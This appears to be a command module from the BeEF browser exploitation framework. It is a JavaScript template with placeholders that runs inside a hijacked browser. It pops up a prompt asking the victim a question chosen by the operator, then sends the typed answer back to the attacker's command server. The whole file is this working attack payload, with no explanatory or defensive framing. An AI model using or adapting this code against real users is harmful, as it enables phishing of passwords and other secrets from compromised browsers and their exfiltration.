beef.execute(function() {
  
  var answer = prompt("<%== @question %>","")
  beef.net.send('<%= @command_url %>', <%= @command_id %>, 'answer='+escape(answer));
});
